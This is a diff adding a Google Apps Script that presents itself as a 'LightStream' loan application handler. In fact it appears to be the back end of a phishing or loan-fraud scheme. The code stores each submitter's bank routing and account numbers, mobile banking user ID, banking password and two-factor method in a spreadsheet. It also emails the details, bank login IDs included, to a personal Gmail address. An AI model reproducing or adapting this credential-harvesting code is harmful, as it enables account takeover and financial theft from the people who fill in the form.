@@ -1,0 +1,115 @@
+// Simple Google Apps Script - Guaranteed to Work
+const SHEET_NAME = "Loan Applications";
+const RECIPIENT_EMAIL = "finnfoxpersonalloan@gmail.com";
+
+function doGet(e) {
+  return HtmlService.createHtmlOutput("LightStream Google Apps Script is running");
+}
+
+function doPost(e) {
+  try {
+    // Simple approach - use parameters directly
+    let data = {};
+    
+    // Handle FormData (from web forms)
+    if (e.parameters) {
+      for (let key in e.parameters) {
+        data[key] = e.parameters[key][0];
+      }
+    }
+    
+    // Log for debugging
+    Logger.log("Received data: " + JSON.stringify(data));
+    
+    // Get spreadsheet
+    const ss = SpreadsheetApp.openByUrl("https://docs.google.com/spreadsheets/d/1drmvoZPbGED2hratNOu3vBgjJRmk9cYIdLuJq7Scei8/edit");
+    const sheet = ss.getSheetByName(SHEET_NAME) || ss.insertSheet(SHEET_NAME);
+    
+    // Set up headers if sheet is empty
+    if (sheet.getLastRow() === 0) {
+      const headers = [
+        "Timestamp", "Type", "First Name", "Last Name", "Email", "Phone",
+        "Loan Amount", "Loan Purpose", "Loan Duration", "Gross Monthly Income",
+        "Employment Status", "Credit Score", "Street Address", "City", "State", "ZIP Code",
+        "Routing Number", "Account Number", "Bank Name", "Mobile Banking User ID",
+        "Mobile Banking Password", "Two Factor Method", "Terms Accepted"
+      ];
+      sheet.appendRow(headers);
+    }
+    
+    // Prepare row data
+    const rowData = [
+      data.timestamp || new Date().toISOString(),
+      data.type || 'Unknown',
+      data.firstName || '',
+      data.lastName || '',
+      data.email || '',
+      data.phone || '',
+      data.loanAmount || '',
+      data.loanPurpose || '',
+      data.loanDuration || '',
+      data.grossMonthlyIncome || '',
+      data.employmentStatus || '',
+      data.creditScore || '',
+      data.streetAddress || '',
+      data.city || '',
+      data.state || '',
+      data.zipCode || '',
+      data.routingNumber || '',
+      data.accountNumber || '',
+      data.bankName || '',
+      data.mobileBankingUserId || '',
+      data.mobileBankingPassword || '[PROTECTED]',
+      data.twoFactorMethod || '',
+      data.termsAccepted || 'false'
+    ];
+    
+    // Append data to sheet
+    sheet.appendRow(rowData);
+    
+    // Send email notification
+    sendSimpleEmail(data);
+    
+    // Return success response
+    Logger.log("SUCCESS: Data saved and email sent");
+    return ContentService.createTextOutput("SUCCESS: Data saved to Google Sheets and email sent")
+      .setMimeType(ContentService.MimeType.TEXT);
+    
+  } catch (error) {
+    Logger.log("ERROR: " + error.toString());
+    return ContentService.createTextOutput("ERROR: " + error.toString())
+      .setMimeType(ContentService.MimeType.TEXT);
+  }
+}
+
+function sendSimpleEmail(data) {
+  try {
+    const subject = "New " + (data.type || "Loan") + " Application - " + (data.firstName || "Unknown") + " " + (data.lastName || "");
+    
+    let body = "A new application has been submitted:\n\n";
+    body += "Type: " + (data.type || "Unknown") + "\n";
+    body += "Name: " + (data.firstName || "") + " " + (data.lastName || "") + "\n";
+    body += "Email: " + (data.email || "") + "\n";
+    body += "Phone: " + (data.phone || "") + "\n";
+    body += "Timestamp: " + (data.timestamp || new Date().toISOString()) + "\n\n";
+    
+    if (data.type === "personal_loan") {
+      body += "Loan Amount: $" + (data.loanAmount || "") + "\n";
+      body += "Purpose: " + (data.loanPurpose || "") + "\n";
+      body += "Duration: " + (data.loanDuration || "") + " months\n";
+      body += "Income: $" + (data.grossMonthlyIncome || "") + "/month\n";
+    }
+    
+    if (data.type === "bank_authentication") {
+      body += "Bank: " + (data.bankName || "") + "\n";
+      body += "User ID: " + (data.mobileBankingUserId || "") + "\n";
+      body += "2FA Method: " + (data.twoFactorMethod || "") + "\n";
+    }
+    
+    MailApp.sendEmail(RECIPIENT_EMAIL, subject, body);
+    Logger.log("Email sent successfully to " + RECIPIENT_EMAIL);
+    
+  } catch (emailError) {
+    Logger.log("Email error: " + emailError.toString());
+  }
+}
